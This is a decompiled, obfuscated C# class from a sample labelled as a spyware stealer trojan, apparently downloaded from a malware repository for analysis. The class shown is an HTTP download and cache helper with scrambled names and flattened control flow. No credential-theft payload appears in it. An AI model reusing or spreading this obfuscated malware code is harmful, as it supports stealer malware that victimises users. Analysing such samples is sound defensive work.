// Decompiled with JetBrains decompiler
// Type: Xq8heDpTCPJayNT7lI.J6iPDbgMshEgTWP2Pf
// Assembly: StaticArrayInitTypeSiz, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F19BBEE0-E53D-4450-9FD0-690E55E6EA19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f0ecfcd8bb00afbfd59777ba3abc9203b4a527d8ea974dcf87076b4d013c0af1.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Web;

namespace Xq8heDpTCPJayNT7lI
{
  internal static class J6iPDbgMshEgTWP2Pf
  {
    private static readonly string CEJHBC4evk;
    private static readonly MD5 rbeHG2jty4;
    private static readonly UTF8Encoding rqDHcgofL2;
    internal static J6iPDbgMshEgTWP2Pf Xc6nXcEpPAUG723Ycqf;

    [SpecialName]
    public static string BewHeteFps() => J6iPDbgMshEgTWP2Pf.CEJHBC4evk;

    [SpecialName]
    public static MD5 RjVHiNj54Q() => J6iPDbgMshEgTWP2Pf.rbeHG2jty4;

    [SpecialName]
    public static UTF8Encoding zqNHkZfuA2() => J6iPDbgMshEgTWP2Pf.rqDHcgofL2;

    public static kFEUcmqe6LYj4ZtZTT AG8HF5oImo(
      string _param0,
      string _param1,
      TimeSpan _param2)
    {
      return J6iPDbgMshEgTWP2Pf.aadHt6DFmE(_param0, _param1, _param2, (GOfqNtt5HGIITAXOqc) null);
    }

    public static kFEUcmqe6LYj4ZtZTT aadHt6DFmE(
      string _param0,
      string _param1,
      TimeSpan _param2,
      GOfqNtt5HGIITAXOqc _param3)
    {
      return J6iPDbgMshEgTWP2Pf.niuHwT2c42(TRSR7EayeYQEkIYTMx.Get, _param0, _param1, (sl4ZfjrcuUCSnjUV7W) new OtTaZP4tJAG5cJli3D(_param2), (IEnumerable<KeyValuePair<string, string>>) null, _param3);
    }

    public static kFEUcmqe6LYj4ZtZTT wHSHaTvJnn(
      string _param0,
      string _param1,
      sl4ZfjrcuUCSnjUV7W _param2,
      GOfqNtt5HGIITAXOqc _param3)
    {
      return J6iPDbgMshEgTWP2Pf.niuHwT2c42(TRSR7EayeYQEkIYTMx.Get, _param0, _param1, _param2, (IEnumerable<KeyValuePair<string, string>>) null, _param3);
    }

    public static kFEUcmqe6LYj4ZtZTT LirHglN7yW(
      string _param0,
      string _param1,
      TimeSpan _param2,
      IEnumerable<KeyValuePair<string, string>> _param3)
    {
      return J6iPDbgMshEgTWP2Pf.urbHKDVKO0(_param0, _param1, _param2, _param3, (GOfqNtt5HGIITAXOqc) null);
    }

    public static kFEUcmqe6LYj4ZtZTT urbHKDVKO0(
      string _param0,
      string _param1,
      TimeSpan _param2,
      IEnumerable<KeyValuePair<string, string>> _param3,
      GOfqNtt5HGIITAXOqc _param4)
    {
      return J6iPDbgMshEgTWP2Pf.niuHwT2c42(TRSR7EayeYQEkIYTMx.Post, _param0, _param1, (sl4ZfjrcuUCSnjUV7W) new OtTaZP4tJAG5cJli3D(_param2), _param3, _param4);
    }

    public static kFEUcmqe6LYj4ZtZTT hTXHvjBZwN(
      string _param0,
      string _param1,
      sl4ZfjrcuUCSnjUV7W _param2,
      IEnumerable<KeyValuePair<string, string>> _param3,
      GOfqNtt5HGIITAXOqc _param4)
    {
      return J6iPDbgMshEgTWP2Pf.niuHwT2c42(TRSR7EayeYQEkIYTMx.Post, _param0, _param1, _param2, _param3, _param4);
    }

    private static kFEUcmqe6LYj4ZtZTT niuHwT2c42(
      TRSR7EayeYQEkIYTMx _param0,
      string _param1,
      string _param2,
      sl4ZfjrcuUCSnjUV7W _param3,
      IEnumerable<KeyValuePair<string, string>> _param4,
      GOfqNtt5HGIITAXOqc _param5)
    {
      string str = (string) null;
      if (_param0 == TRSR7EayeYQEkIYTMx.Get && _param4 != null)
        throw new ArgumentException("GET method and parameters don't mix");
      kFEUcmqe6LYj4ZtZTT feUcmqe6Lyj4ZtZtt = J6iPDbgMshEgTWP2Pf.KgwHMZOwrA(_param2, _param3);
      if (feUcmqe6Lyj4ZtZtt.sQOAox7AGf() == (DV4WTAsIc1WQBXhuQc) 0)
        return feUcmqe6Lyj4ZtZtt;
      try
      {
        switch (_param0)
        {
          case TRSR7EayeYQEkIYTMx.Get:
            str = J6iPDbgMshEgTWP2Pf.LPJH5QXmv5(_param1);
            break;
          case TRSR7EayeYQEkIYTMx.Post:
            str = J6iPDbgMshEgTWP2Pf.F5PH18P5x5(_param1, _param4);
            break;
          default:
            throw new ArgumentException("Unknown HTTP method " + _param0.ToString());
        }
        if (_param5 != null)
          _param5(str);
        System.IO.File.Copy(str, _param2, true);
        return new kFEUcmqe6LYj4ZtZTT(_param2, true, (DV4WTAsIc1WQBXhuQc) 0, _param3.ncma50pOAi(_param2));
      }
      catch (Exception ex)
      {
        return feUcmqe6Lyj4ZtZtt.sQOAox7AGf() != (DV4WTAsIc1WQBXhuQc) 2 ? kFEUcmqe6LYj4ZtZTT.kdlA8OA5b6(feUcmqe6Lyj4ZtZtt, ex) : kFEUcmqe6LYj4ZtZTT.j13AbsjpPH(ex);
      }
      finally
      {
        try
        {
          if (!string.IsNullOrEmpty(str))
            System.IO.File.Delete(str);
        }
        catch
        {
        }
      }
    }

    public static string LPJH5QXmv5(string _param0)
    {
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
      httpWebRequest.KeepAlive = false;
      httpWebRequest.Method = "GET";
      httpWebRequest.UserAgent = "HeavyDuck.Eve";
      WebResponse webResponse = (WebResponse) null;
      int num1 = 0;
      if (!J6iPDbgMshEgTWP2Pf.jtU1KqESdLx8438hM7t())
        goto label_2;
label_1:
      switch (num1)
      {
        default:
          try
          {
            webResponse = httpWebRequest.GetResponse();
            using (Stream responseStream = webResponse.GetResponseStream())
              return J6iPDbgMshEgTWP2Pf.IaCHfGY4xh(responseStream);
          }
          finally
          {
            webResponse?.Close();
          }
      }
label_2:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public static string F5PH18P5x5(
      string _param0,
      IEnumerable<KeyValuePair<string, string>> _param1)
    {
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
      httpWebRequest.ContentType = "application/x-www-form-urlencoded";
      httpWebRequest.KeepAlive = false;
      httpWebRequest.Method = "POST";
      httpWebRequest.UserAgent = "HeavyDuck.Eve";
      httpWebRequest.ServicePoint.Expect100Continue = false;
      WebResponse webResponse = (WebResponse) null;
      try
      {
        using (Stream requestStream = httpWebRequest.GetRequestStream())
        {
          byte[] bytes = J6iPDbgMshEgTWP2Pf.zqNHkZfuA2().GetBytes(J6iPDbgMshEgTWP2Pf.amJHuH2Kxl(_param1));
          requestStream.Write(bytes, 0, bytes.Length);
        }
        webResponse = httpWebRequest.GetResponse();
        using (Stream responseStream = webResponse.GetResponseStream())
          return J6iPDbgMshEgTWP2Pf.IaCHfGY4xh(responseStream);
      }
      finally
      {
        webResponse?.Close();
      }
    }

    public static string IaCHfGY4xh(Stream _param0)
    {
      string path = (string) null;
      byte[] buffer = new byte[32768];
      int offset = 0;
      try
      {
        path = Path.GetTempFileName();
        FileStream fileStream = (FileStream) J6iPDbgMshEgTWP2Pf.nKXCMcdVJ4KsBKjYvD6((object) path, FileMode.Open, FileAccess.Write);
        try
        {
          int count;
          while (0 < (count = _param0.Read(buffer, offset, buffer.Length)))
            fileStream.Write(buffer, 0, count);
        }
        finally
        {
          if (fileStream != null)
            J6iPDbgMshEgTWP2Pf.u12T8YdQH1NMnTOxi62((object) fileStream);
        }
      }
      catch
      {
        try
        {
          if (!J6iPDbgMshEgTWP2Pf.IIm9a1dEnxLLKoilf3N((object) path))
            System.IO.File.Delete(path);
        }
        catch
        {
        }
        throw;
      }
      return path;
    }

    public static kFEUcmqe6LYj4ZtZTT t2mHOkK0j3(string _param0, TimeSpan _param1) => J6iPDbgMshEgTWP2Pf.KgwHMZOwrA(_param0, (sl4ZfjrcuUCSnjUV7W) new OtTaZP4tJAG5cJli3D(_param1));

    public static kFEUcmqe6LYj4ZtZTT KgwHMZOwrA(
      string _param0,
      sl4ZfjrcuUCSnjUV7W _param1)
    {
      kFEUcmqe6LYj4ZtZTT feUcmqe6Lyj4ZtZtt;
      try
      {
        if (!new FileInfo(_param0).Exists)
        {
          feUcmqe6Lyj4ZtZtt = kFEUcmqe6LYj4ZtZTT.GDYA2D63xk(_param0);
          int num = 1;
          if (!J6iPDbgMshEgTWP2Pf.jtU1KqESdLx8438hM7t())
            goto label_5;
label_2:
          switch (num)
          {
            case 1:
              goto label_9;
            default:
              goto label_6;
          }
label_5:
          num = 1;
          goto label_2;
        }
        else
          goto label_7;
label_6:
        DateTime dateTime;
        feUcmqe6Lyj4ZtZtt = new kFEUcmqe6LYj4ZtZTT(_param0, false, (DV4WTAsIc1WQBXhuQc) 0, dateTime);
        goto label_9;
label_7:
        dateTime = J6iPDbgMshEgTWP2Pf.RycBfIddtBC6k0qVyko((object) _param1, (object) _param0);
        if (!(DateTime.Now < dateTime))
          feUcmqe6Lyj4ZtZtt = new kFEUcmqe6LYj4ZtZTT(_param0, false, (DV4WTAsIc1WQBXhuQc) 1, dateTime);
        else
          goto label_6;
      }
      catch (Exception ex)
      {
        feUcmqe6Lyj4ZtZtt = kFEUcmqe6LYj4ZtZTT.LAVArEVf4G(_param0, ex);
      }
label_9:
      return feUcmqe6Lyj4ZtZtt;
    }

    public static string amJHuH2Kxl(IEnumerable<KeyValuePair<string, string>> _param0)
    {
      if (_param0 == null)
        return "";
      List<KeyValuePair<string, string>> keyValuePairList = new List<KeyValuePair<string, string>>(_param0);
      keyValuePairList.Sort((Comparison<KeyValuePair<string, string>>) ((a, b) => a.Key == b.Key ? string.Compare(a.Value, b.Value) : string.Compare(a.Key, b.Key)));
      StringBuilder stringBuilder = new StringBuilder();
      foreach (KeyValuePair<string, string> keyValuePair in keyValuePairList)
      {
        stringBuilder.Append(HttpUtility.UrlEncode(keyValuePair.Key));
        stringBuilder.Append("=");
        stringBuilder.Append(HttpUtility.UrlEncode(keyValuePair.Value));
        stringBuilder.Append("&");
      }
      if (stringBuilder.Length > 0)
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
      return stringBuilder.ToString();
    }

    public static string vymHDAry7W(IEnumerable<KeyValuePair<string, string>> _param0) => J6iPDbgMshEgTWP2Pf.SsbHdgXMUY(_param0, (Encoding) J6iPDbgMshEgTWP2Pf.zqNHkZfuA2());

    public static string SsbHdgXMUY(
      IEnumerable<KeyValuePair<string, string>> _param0,
      Encoding _param1)
    {
      return BitConverter.ToString(J6iPDbgMshEgTWP2Pf.RjVHiNj54Q().ComputeHash(_param1.GetBytes(J6iPDbgMshEgTWP2Pf.amJHuH2Kxl(_param0)))).Replace("-", "");
    }

    static J6iPDbgMshEgTWP2Pf()
    {
      NxX2fTcxLE28NYvGZm.dOE6C8et8tGSe();
      J6iPDbgMshEgTWP2Pf.CEJHBC4evk = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "HeavyDuck.Eve");
      J6iPDbgMshEgTWP2Pf.rbeHG2jty4 = MD5.Create();
      J6iPDbgMshEgTWP2Pf.rqDHcgofL2 = new UTF8Encoding(false);
    }

    internal static bool jtU1KqESdLx8438hM7t() => J6iPDbgMshEgTWP2Pf.Xc6nXcEpPAUG723Ycqf == null;

    internal static J6iPDbgMshEgTWP2Pf VdGJCcEzWPO76Qnx9bU() => J6iPDbgMshEgTWP2Pf.Xc6nXcEpPAUG723Ycqf;

    internal static object nKXCMcdVJ4KsBKjYvD6([In] object obj0, [In] FileMode obj1, [In] FileAccess obj2) => (object) System.IO.File.Open((string) obj0, obj1, obj2);

    internal static void u12T8YdQH1NMnTOxi62([In] object obj0) => ((IDisposable) obj0).Dispose();

    internal static bool IIm9a1dEnxLLKoilf3N([In] object obj0) => string.IsNullOrEmpty((string) obj0);

    internal static DateTime RycBfIddtBC6k0qVyko([In] object obj0, [In] object obj1) => ((sl4ZfjrcuUCSnjUV7W) obj0).ncma50pOAi((string) obj1);
  }
}
